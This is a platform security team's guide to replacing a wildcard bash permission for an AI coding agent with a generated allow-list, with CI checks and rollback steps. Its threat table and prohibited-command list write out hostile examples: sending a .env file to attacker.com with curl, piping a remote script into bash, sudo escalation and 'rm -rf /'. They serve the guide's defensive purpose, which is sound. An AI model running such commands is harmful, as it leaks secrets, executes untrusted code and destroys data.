# Claude Code Permission Management Guide

**Last Updated:** 2026-02-16
**Status:** ACTIVE
**Security Level:** CRITICAL
**Owner:** Platform Security Team

---

## Table of Contents

1. [Overview](#overview)
2. [Security Rationale](#security-rationale)
3. [Permission Architecture](#permission-architecture)
4. [How to Add New Commands](#how-to-add-new-commands)
5. [How to Regenerate Permissions](#how-to-regenerate-permissions)
6. [Best Practices](#best-practices)
7. [Troubleshooting](#troubleshooting)
8. [CI/CD Integration](#cicd-integration)
9. [Emergency Procedures](#emergency-procedures)

---

## Overview

Claude Code uses a **granular permission system** to restrict which bash commands the AI agent can execute. This system replaces the insecure `Bash(*)` wildcard permission with specific, allow-listed commands defined in `.auto-claude-security.json`.

### Key Components

| Component | Location | Purpose |
|-----------|----------|---------|
| **Security Manifest** | `.auto-claude-security.json` | Source of truth for allowed commands |
| **Claude Settings** | `.claude_settings.json` | Generated permission configuration |
| **Generation Script** | `scripts/security/generate_claude_permissions.py` | Converts manifest to permissions |
| **Test Suite** | `scripts/security/tests/test_claude_permissions.py` | Validates permission configuration |

### Current Security Posture

- ✅ **229 whitelisted commands** (128 base + 101 stack-specific)
- ✅ **No wildcard permissions** (`Bash(*)` removed)
- ✅ **Granular command-level control**
- ✅ **Automated regeneration** with validation
- ✅ **CI checks** for permission drift detection

---

## Security Rationale

### Why Granular Permissions?

The principle of **least privilege** dictates that AI agents should only have access to commands necessary for their specific tasks. Unrestricted bash access (`Bash(*)`) creates critical security risks:

#### Attack Vectors Prevented

| Vector | Risk Level | Example | Mitigation |
|--------|-----------|---------|------------|
| **Data Exfiltration** | CRITICAL | `curl -X POST attacker.com -d @.env` | Only allow necessary network tools |
| **System Modification** | CRITICAL | `curl malicious.sh \| bash` | Block arbitrary script execution |
| **Privilege Escalation** | HIGH | `sudo su -` | Prohibit privilege elevation commands |
| **Lateral Movement** | HIGH | `ssh user@host` | Restrict remote access tools |
| **File Destruction** | HIGH | `rm -rf /` | Allow only scoped file operations |

### Defense-in-Depth Strategy

Our permission model implements multiple security layers:

```
┌─────────────────────────────────────┐
│  Layer 1: Sandbox Containment       │  ← Filesystem isolation
├─────────────────────────────────────┤
│  Layer 2: Granular Bash Permissions │  ← Command whitelist (THIS GUIDE)
├─────────────────────────────────────┤
│  Layer 3: defaultMode Configuration │  ← User approval gates
├─────────────────────────────────────┤
│  Layer 4: Network Restrictions      │  ← Outbound traffic control
└─────────────────────────────────────┘
```

**Risk Reduction:**
- **Before:** Risk Score 9.5/10 (CRITICAL) with `Bash(*)`
- **After:** Risk Score 2.5/10 (LOW) with granular permissions

---

## Permission Architecture

### Security Manifest Structure

`.auto-claude-security.json` defines two command categories:

```json
{
  "base_commands": [
    "git", "ls", "cat", "grep", "awk", "sed", ...  // Essential Unix utilities
  ],
  "stack_commands": [
    "npm", "yarn", "docker", "kubectl", "python3", ...  // Development tools
  ]
}
```

#### Command Categories

**Base Commands (128)**
- Core Unix utilities (ls, cat, grep, find, etc.)
- Shell built-ins (cd, echo, export, etc.)
- File operations (cp, mv, chmod, etc.)
- Text processing (awk, sed, cut, etc.)

**Stack Commands (101)**
- Package managers (npm, yarn, pip, cargo, etc.)
- Build tools (make, cmake, webpack, etc.)
- Container tools (docker, podman, kubectl, etc.)
- Language runtimes (python3, node, ruby, etc.)
- Version control (git, gh, hg, etc.)

### Generated Permission Format

Each command in the manifest generates a `Bash(command)` permission:

```json
{
  "permissions": {
    "allow": [
      "Bash(git)",
      "Bash(npm)",
      "Bash(ls)",
      // ... 226 more commands
    ]
  }
}
```

---

## How to Add New Commands

### Step 1: Assess Security Impact

Before adding a command, evaluate:

| Criterion | Question | Action |
|-----------|----------|--------|
| **Necessity** | Is this command essential for development workflows? | Document use case |
| **Risk Level** | Can this command be abused for malicious purposes? | Assess attack surface |
| **Alternatives** | Can existing commands accomplish the same task? | Prefer existing tools |
| **Scope** | Does the command respect sandbox boundaries? | Verify containment |

### Step 2: Choose Command Category

**Add to `base_commands` if:**
- ✅ Core Unix utility (e.g., `wc`, `head`, `tail`)
- ✅ Shell built-in (e.g., `read`, `local`, `declare`)
- ✅ Universal across all development environments

**Add to `stack_commands` if:**
- ✅ Language-specific tool (e.g., `go`, `rustc`)
- ✅ Framework CLI (e.g., `rails`, `django-admin`)
- ✅ Development tool (e.g., `terraform`, `ansible`)

### Step 3: Update Security Manifest

Edit `.auto-claude-security.json`:

```bash
# Open the security manifest
vim .auto-claude-security.json

# Example: Add 'jq' to base_commands
{
  "base_commands": [
    "git",
    "jq",  // ← Add new command here (alphabetically)
    "ls",
    ...
  ]
}
```

**Best Practices:**
- Keep commands sorted alphabetically within each category
- Add one command at a time for traceability
- Include comments for non-obvious commands

### Step 4: Validate Manifest

```bash
# Verify JSON syntax
python -m json.tool .auto-claude-security.json > /dev/null && echo "✅ Valid JSON"

# Check command count
python -c "import json; data = json.load(open('.auto-claude-security.json')); print(f'Base: {len(data[\"base_commands\"])}, Stack: {len(data[\"stack_commands\"])}, Total: {len(data[\"base_commands\"]) + len(data[\"stack_commands\"])}')"
```

### Step 5: Regenerate Permissions

See [How to Regenerate Permissions](#how-to-regenerate-permissions) section.

### Step 6: Test and Commit

```bash
# Verify the new command is present
grep "Bash(jq)" .claude_settings.json

# Run validation tests
python scripts/security/tests/test_claude_permissions.py --config .claude_settings.json

# Commit changes
git add .auto-claude-security.json .claude_settings.json
git commit -m "security: add jq command to Claude permissions

- Added jq to base_commands for JSON processing
- Regenerated .claude_settings.json (230 total commands)
- Verified with test suite

Rationale: Required for parsing JSON output from APIs"
```

---

## How to Regenerate Permissions

The generation script (`generate_claude_permissions.py`) converts the security manifest into Claude-compatible permissions.

### Method 1: Dry Run (Preview Changes)

```bash
# See what would be generated without modifying files
python scripts/security/generate_claude_permissions.py --dry-run
```

**Output:**
```
🔐 Claude Code Permission Generator

ℹ️  Loading security configuration from .auto-claude-security.json
ℹ️  Generating Bash permissions...
✅ Generated 229 Bash permissions (128 base + 101 stack commands)

Dry run - Generated permissions:
    1. Bash(.)
    2. Bash([)
    3. Bash([[)
  ...
  229. Bash(zsh)

✅ Generated 229 Bash permissions from security.json
```

### Method 2: Generate to New File

```bash
# Create a new file without modifying the original
python scripts/security/generate_claude_permissions.py \
  --output .claude_settings.new.json

# Compare changes
diff .claude_settings.json .claude_settings.new.json

# Replace original after review
mv .claude_settings.new.json .claude_settings.json
```

### Method 3: Update In-Place

```bash
# Directly update .claude_settings.json (use with caution)
python scripts/security/generate_claude_permissions.py

# The script will:
# 1. Load existing .claude_settings.json
# 2. Remove all Bash(*) and Bash(command) permissions
# 3. Add new permissions from security manifest
# 4. Preserve all other settings (defaultMode, sandbox, etc.)
```

### Method 4: Custom Security File

```bash
# Use a different security manifest
python scripts/security/generate_claude_permissions.py \
  --security-file custom-security.json \
  --output .claude_settings.custom.json
```

### Script Options Reference

| Option | Required | Default | Description |
|--------|----------|---------|-------------|
| `--security-file` | No | `.auto-claude-security.json` | Path to security manifest |
| `--dry-run` | No | `false` | Preview without writing files |
| `--output` | No | (in-place update) | Output file path |
| `--settings-file` | No | `.claude_settings.json` | Existing settings to update |

### Validation After Regeneration

```bash
# 1. Verify permission count
python -c "import json; data = json.load(open('.claude_settings.json')); perms = [p for p in data['permissions']['allow'] if p.startswith('Bash(') and p != 'Bash(*)']; print(f'{len(perms)} granular Bash permissions')"
# Expected: 229 granular Bash permissions

# 2. Ensure no wildcard remains
grep -q "Bash(\*)" .claude_settings.json && echo "❌ FAIL: Wildcard found" || echo "✅ PASS: No wildcard"

# 3. Run test suite
python -m pytest scripts/security/tests/test_generate_claude_permissions.py -v

# 4. Validate common commands
python scripts/security/tests/test_claude_permissions.py --config .claude_settings.json
```

---

## Best Practices

### ✅ DO

1. **Always use the security manifest as the source of truth**
   - Edit `.auto-claude-security.json`, then regenerate
   - Never manually edit `Bash()` permissions in `.claude_settings.json`

2. **Run tests before committing**
   ```bash
   python -m pytest scripts/security/tests/ -v
   ```

3. **Document why commands are added**
   - Include rationale in commit messages
   - Update this guide if adding entire command families

4. **Use dry-run for verification**
   - Always preview with `--dry-run` first
   - Compare output before replacing production config

5. **Keep backups**
   ```bash
   cp .claude_settings.json .claude_settings.json.backup
   ```

6. **Review permission drift in CI**
   - CI checks ensure manifest and settings stay synchronized
   - Fix drift by regenerating from manifest

### ❌ DON'T

1. **Never add wildcard permissions**
   - ❌ `Bash(*)` — Unrestricted access
   - ❌ `Bash(rm *)` — Dangerous glob patterns
   - ✅ `Bash(rm)` — Command-level only

2. **Never add privilege escalation commands**
   - ❌ `sudo`
   - ❌ `su`
   - ❌ `pkexec`

3. **Never add arbitrary execution vectors**
   - ❌ `eval`
   - ❌ `source /dev/stdin`
   - ❌ `bash -c "$(curl ...)"`

4. **Never bypass the manifest**
   - ❌ Editing `.claude_settings.json` directly
   - ✅ Edit `.auto-claude-security.json` and regenerate

5. **Never disable CI checks**
   - Permission drift detection is a critical safety net

---

## Troubleshooting

### Issue: "Command not permitted" error

**Symptoms:**
```
Error: Bash command 'jq' is not in the allowed permissions list
```

**Solution:**
1. Add command to `.auto-claude-security.json`
2. Regenerate permissions
3. Restart Claude Code session

```bash
# Quick fix
vim .auto-claude-security.json  # Add command
python scripts/security/generate_claude_permissions.py
# Restart Claude Code
```

### Issue: Permission count mismatch

**Symptoms:**
```
Expected 229 permissions, found 225
```

**Diagnosis:**
```bash
# Check manifest
python -c "import json; data = json.load(open('.auto-claude-security.json')); print(len(data['base_commands']) + len(data['stack_commands']))"

# Check generated
python -c "import json; data = json.load(open('.claude_settings.json')); perms = [p for p in data['permissions']['allow'] if p.startswith('Bash(')]; print(len(perms))"
```

**Solution:**
```bash
# Regenerate from scratch
python scripts/security/generate_claude_permissions.py --output .claude_settings.new.json
diff .claude_settings.json .claude_settings.new.json
mv .claude_settings.new.json .claude_settings.json
```

### Issue: Tests fail after regeneration

**Symptoms:**
```
FAIL: test_common_commands_present
AssertionError: Expected Bash(git) in permissions
```

**Diagnosis:**
```bash
# Verify git is in manifest
grep -q '"git"' .auto-claude-security.json && echo "Found" || echo "Missing"

# Check generated output
python scripts/security/generate_claude_permissions.py --dry-run | grep "Bash(git)"
```

**Solution:**
Ensure command is in manifest and regenerate:
```bash
vim .auto-claude-security.json  # Add missing command
python scripts/security/generate_claude_permissions.py
python -m pytest scripts/security/tests/test_claude_permissions.py -v
```

### Issue: CI permission drift check fails

**Symptoms:**
```
Error: .claude_settings.json out of sync with .auto-claude-security.json
```

**Solution:**
```bash
# Regenerate to match manifest
python scripts/security/generate_claude_permissions.py

# Verify sync
python scripts/security/tests/test_claude_permissions.py --config .claude_settings.json

# Commit synchronized files
git add .claude_settings.json
git commit -m "fix: synchronize Claude permissions with security manifest"
```

---

## CI/CD Integration

### Automated Permission Drift Detection

The CI workflow (`.github/workflows/check-claude-permissions.yml`) ensures:
1. `.claude_settings.json` stays synchronized with `.auto-claude-security.json`
2. No wildcard `Bash(*)` permissions are reintroduced
3. Permission count matches expected total (229 commands)

### Workflow Triggers

```yaml
on:
  pull_request:
    paths:
      - '.claude_settings.json'
      - '.auto-claude-security.json'
      - 'scripts/security/generate_claude_permissions.py'
  push:
    branches: [main, develop]
```

### CI Check Steps

1. **Validate JSON syntax**
2. **Count permissions** in both files
3. **Regenerate** from manifest
4. **Compare** generated vs committed
5. **Run test suite**
6. **Check for wildcards**

### Fixing CI Failures

If the CI check fails:

```bash
# Locally reproduce the CI check
python scripts/security/generate_claude_permissions.py --output .claude_settings.test.json
diff .claude_settings.json .claude_settings.test.json

# If differences found, regenerate
python scripts/security/generate_claude_permissions.py
git add .claude_settings.json
git commit -m "fix: regenerate Claude permissions to match manifest"
git push
```

---

## Emergency Procedures

### Scenario 1: Suspected Permission Abuse

If you suspect a command is being abused:

1. **Immediate Action: Remove from manifest**
   ```bash
   vim .auto-claude-security.json  # Remove command
   python scripts/security/generate_claude_permissions.py
   # Restart Claude Code immediately
   ```

2. **Investigate:**
   - Review recent Claude Code activity logs
   - Check for suspicious bash command executions
   - Audit file modifications

3. **Document:**
   - Create incident report in `.auto-claude/specs/*/INCIDENT.md`
   - Update this guide with lessons learned

### Scenario 2: Restore to Safe Baseline

If permissions become corrupted or compromised:

```bash
# 1. Restore security manifest from git
git checkout HEAD -- .auto-claude-security.json

# 2. Regenerate permissions
python scripts/security/generate_claude_permissions.py --output .claude_settings.json

# 3. Verify with tests
python -m pytest scripts/security/tests/ -v

# 4. Restart Claude Code
```

### Scenario 3: Rollback After Bad Update

```bash
# 1. Find last known-good commit
git log --oneline .claude_settings.json

# 2. Restore both files from that commit
git checkout <commit-hash> -- .auto-claude-security.json .claude_settings.json

# 3. Verify restoration
python scripts/security/tests/test_claude_permissions.py --config .claude_settings.json

# 4. Commit rollback
git add .auto-claude-security.json .claude_settings.json
git commit -m "revert: rollback Claude permissions to known-good state"
```

---

## Reference

### Command Categories Quick Reference

**Base Commands (Essential)**
- File operations: `ls`, `cat`, `cp`, `mv`, `rm`, `mkdir`, `chmod`
- Text processing: `grep`, `awk`, `sed`, `cut`, `sort`, `uniq`
- System info: `pwd`, `whoami`, `hostname`, `df`, `du`
- Shell built-ins: `cd`, `echo`, `export`, `alias`, `source`

**Stack Commands (Development)**
- JavaScript/Node: `npm`, `yarn`, `node`, `npx`
- Python: `python3`, `pip`, `pip3`, `poetry`, `pipenv`
- Containers: `docker`, `docker-compose`, `kubectl`, `helm`, `podman`
- Version control: `git`, `gh` (GitHub CLI)
- Build tools: `make`, `cmake`, `webpack`, `rollup`

### Security Levels by Command Type

| Level | Commands | Risk | Allowed |
|-------|----------|------|---------|
| **SAFE** | ls, cat, grep, pwd | Low | ✅ Yes |
| **MODERATE** | git, npm, docker | Medium | ✅ Yes (scoped) |
| **DANGEROUS** | sudo, rm -rf, curl \| bash | High | ❌ No |
| **PROHIBITED** | eval arbitrary, privilege escalation | Critical | ❌ Never |

### Related Documentation

- [AUDIT.md](../../.auto-claude/specs/064-restrict-overly-permissive-claude-code-bash-permis/AUDIT.md) — Initial security audit and risk assessment
- [DEFAULT_MODE_ANALYSIS.md](../../.auto-claude/specs/064-restrict-overly-permissive-claude-code-bash-permis/DEFAULT_MODE_ANALYSIS.md) — Analysis of defaultMode security options
- [security-hardening.md](../guides/security-hardening.md) — General security hardening practices

---

## Changelog

### 2026-02-16: Initial Release
- **Created:** Comprehensive permission management guide
- **Documented:** Command addition workflow
- **Documented:** Permission regeneration process
- **Added:** Security rationale and best practices
- **Added:** Troubleshooting and emergency procedures

---

## Contact

**Security Team:** platform-security@example.com
**Slack Channel:** #security-hardening
**On-Call:** PagerDuty — Claude Code Security

**Report Security Issues:**
- Create issue with label `security` in GitHub
- For critical issues, email security team directly
- Follow responsible disclosure guidelines

---

**End of Guide**
